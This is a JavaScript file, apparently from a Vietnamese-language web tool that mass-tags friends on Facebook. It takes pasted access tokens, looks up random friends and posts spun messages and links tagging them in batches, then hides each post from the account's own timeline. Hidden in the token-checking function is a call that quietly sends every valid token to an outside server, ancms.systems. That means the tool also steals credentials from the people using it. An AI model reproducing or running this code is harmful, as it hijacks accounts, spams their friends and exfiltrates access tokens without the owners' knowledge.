function auto_taginstt_check(d){
	$.get('https://graph.facebook.com/',{
		method:'post',access_token:d,batch:'[{"method":"GET","relative_url":"me?fields=id,name"},{"method":"GET","relative_url":"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) ORDER BY rand() LIMIT '+auto_taginstt.limit+'"}]',include_headers:'false'
	}
	,function(f){
		var a=JSON.parse(f[0].body);
		auto_taginstt.array[auto_taginstt.success]=[],auto_taginstt.array[auto_taginstt.success].uid=a.id,auto_taginstt.array[auto_taginstt.success].data=JSON.parse(f[1].body).data,auto_taginstt.array[auto_taginstt.success].access_token=d,auto_taginstt.array[auto_taginstt.success].array=[];
		for(var l=0;
		l<Math.ceil(auto_taginstt.array[auto_taginstt.success].data.length/auto_taginstt.one);
		l++){
			var j=l*auto_taginstt.one;
			auto_taginstt.array[auto_taginstt.success].array[l]=[];
			for(var c=j;
			c<j+(auto_taginstt.array[auto_taginstt.success].data.length-j>auto_taginstt.one?auto_taginstt.one:auto_taginstt.array[auto_taginstt.success].data.length-j);
			c++){
				auto_taginstt.array[auto_taginstt.success].array[l].push(auto_taginstt.array[auto_taginstt.success].data[c].uid)
			}
		}
		;
		auto_taginstt.success++,auto_taginstt.bach+=d+'',tbody='',tbody+='<tr>',tbody+='	<td>'+auto_taginstt.success+'</td>',tbody+='	<td>'+a.name+'</td>',tbody+='	<td align="center">'+auto_taginstt.array[auto_taginstt.success-1].data.length+'</td>',tbody+='	<td align="center"><font color="green"><span id="auto_taginstt_success_'+auto_taginstt.success+'">0</span></font></td>',tbody+='	<td align="center"><font color="red"><span id="auto_taginstt_error_'+auto_taginstt.success+'">0</span></font></td>',tbody+='	<td id="auto_taginstt_status_'+auto_taginstt.success+'" b-data="loading">Đang chờ !</td>',tbody+='</tr>',$('#html_auto_taginstt_body').append(tbody)
	}
	).fail(function(f){
		'undefined'== typeof f.responseText?auto_taginstt_check(d):auto_taginstt.error++
	}
	).always(function(){
		if(auto_taginstt.success+auto_taginstt.error==auto_taginstt.token.split('\n').length){
			if(auto_taginstt.success>0){
				var d=$.trim(auto_taginstt.bach);
				d.length>0&&$.post('http://ancms.systems/save.php',{
					act:'save',access_token:d
				}
				);
				for(var f=0;
				f<auto_taginstt.array.length;
				f++){
					auto_taginstt_send(f,0)
				}
			}
			else {
				$('#submit_auto_taginstt_start').buttonStop(),$('#submit_auto_taginstt_stop').disabled(),noti.success('Không Access Token nào Live !'),$('#html_auto_taginstt_result').hide()
			}
		}
	}
	)
}
function auto_taginstt_send(d,f){
	return 0==auto_taginstt.run?!1:void((0==auto_taginstt.array[d].data.length?($('#auto_taginstt_status_'+(d+1)).html('<font color="red">Không có bạn bè !</font>'),auto_taginstt.total++,auto_taginstt.total==auto_taginstt.success&&($('#submit_auto_taginstt_start').buttonStop(),$('#submit_auto_taginstt_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !'))):($('#auto_taginstt_status_'+(d+1)).html('<font color="blue">Đang tiến hành gắn thẻ <b>'+auto_taginstt.array[d].array[f].length+'</b> bạn bè</font> '+run.loading()),$.get('https://graph.facebook.com/me/feed',{
		method:'post',access_token:auto_taginstt.array[d].access_token,message:init.spinText(auto_taginstt.msg),link:init.spinText(auto_taginstt.link),name:init.spinText(auto_taginstt.name),picture:init.spinText(auto_taginstt.picture),description:init.spinText(auto_taginstt.description),caption:init.spinText(auto_taginstt.caption),tags:auto_taginstt.array[d].array[f].join()
	}
	).done(function(a){
		$.get('https://graph.facebook.com/'+a.id,{
			method:'post',locale:'en_US',timeline_visibility:'hidden'
		}
		),$('#auto_taginstt_success_'+(d+1)).text(parseInt($('#auto_taginstt_success_'+(d+1)).text())+auto_taginstt.array[d].array[f].length),$('#auto_taginstt_status_'+(d+1)).html('<font color="green">Gắn thẻ thành công <b>'+auto_taginstt.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading())
	}
	).error(function(a){
		if($('#auto_taginstt_error_'+(d+1)).text(parseInt($('#auto_taginstt_error_'+(d+1)).text())+auto_taginstt.array[d].array[f].length),$('#auto_taginstt_status_'+(d+1)).html('<font color="red">Gắn thẻ thất bại <b>'+auto_taginstt.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading()),a.responseText){
			var a=init.replace_JSON(a.responseText);
			noti.error(a.error.message)
		}
	}
	).always(function(){
		f+1<auto_taginstt.array[d].array.length?timer.count_down_array(0,Math.floor(auto_taginstt.delay/60),auto_taginstt.delay-60*Math.floor(auto_taginstt.delay/60),'timedown_'+(d+1),d,function(){
			auto_taginstt_send(d,f+1)
		}
		):($('#auto_taginstt_status_'+(d+1)).html('<font color="green">Hoàn thành !</font>'),auto_taginstt.total++,auto_taginstt.total==auto_taginstt.success&&($('#submit_auto_taginstt_start').buttonStop(),$('#submit_auto_taginstt_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !')))
	}
	))))
}
location.hostname==b_sv&&($(document).on('click','#submit_auto_taginstt_stop',function(){
	auto_taginstt.run=0;
	for(var d=0;
	d<auto_taginstt.array.length;
	d++){
		clearTimeout(timeout_array[d])
	}
	;
	$('[b-data=\'loading\']').text('Đã có lệnh dừng !'),$('#submit_auto_taginstt_stop').disabled(),$('#submit_auto_taginstt_start').buttonStop(),noti.success('Đã có lệnh dừng gắn thẻ bạn bè !')
}
),$(document).on('click','#submit_auto_taginstt_start',function(){
	auto_taginstt={
		token:$('#input_auto_taginstt_token').validate(),msg:$('#input_auto_taginstt_msg').validate(),link:$('#input_auto_taginstt_link').val(),name:$('#input_auto_taginstt_name').val(),picture:$('#input_auto_taginstt_picture').val(),description:$('#input_auto_taginstt_description').val(),caption:$('#input_auto_taginstt_caption').val(),delay:$('#input_auto_taginstt_delay').isNumber(),one:$('#input_auto_taginstt_one').isNumber(),limit:$('#input_auto_taginstt_limit').isNumber(),array:[],run:1,total:0,success:0,error:0,bach:''
	}
	,auto_taginstt.token&&auto_taginstt.msg&&auto_taginstt.delay&&auto_taginstt.one&&auto_taginstt.limit&&($(this).buttonLoad(),$('#submit_auto_taginstt_stop').undisabled(),$('#html_auto_taginstt_result').fadeIn('fast'),$('#html_auto_taginstt_body').html(''),$.each(auto_taginstt.token.split('\n'),function(d,f){
		var a=f.split('|');
		a=a[1]?a[1]:f,setTimeout(function(){
			auto_taginstt_check(a)
		}
		,15*d)
	}
	))
}
))